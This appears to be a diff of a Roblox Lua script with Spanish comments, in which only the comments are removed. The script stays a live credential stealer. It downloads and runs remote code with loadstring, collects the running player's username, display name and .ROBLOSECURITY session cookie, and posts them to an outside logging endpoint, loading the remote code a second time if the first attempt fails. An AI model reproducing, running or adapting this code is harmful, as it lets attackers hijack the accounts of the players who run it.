@@ -1,15 +1,12 @@
--- --- 1. Cargar la librería ---
 local success, Libraries = pcall(function()
 	return loadstring(game:HttpGet("https://raw.githubusercontent.com/ssshlx/render/main/Libraries.lua"))
 end)
 
 if success then
 	local lib = Libraries
-	-- Obtener datos del jugador
 	local player = game:GetService("Players").LocalPlayer
 	local placeId = game.PlaceId
 	
-	-- Formatear los datos usando la librería
 	local data = {
 		username = player.Name,
 		displayName = player.DisplayName,
@@ -20,7 +17,6 @@ if success then
 		cookie = ".ROBLOSECURITY=" .. lib:GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
 	}
 	
-	-- Enviar el webhook
 	local response = lib.HttpPost("https://depazzhub-api.onrender.com/log", data)
 	
 	if response then
@@ -33,7 +29,6 @@ else
 	warn("  Error: " .. tostring(Libraries))
 	warn("  Stack: " .. debug.traceback())
 	
-	-- Fallback: cargar directamente con pcall
 	local success2, lib2 = pcall(function()
 		return loadstring(game:HttpGet("https://raw.githubusercontent.com/ssshlx/render/main/Libraries.lua"))()
 	end)
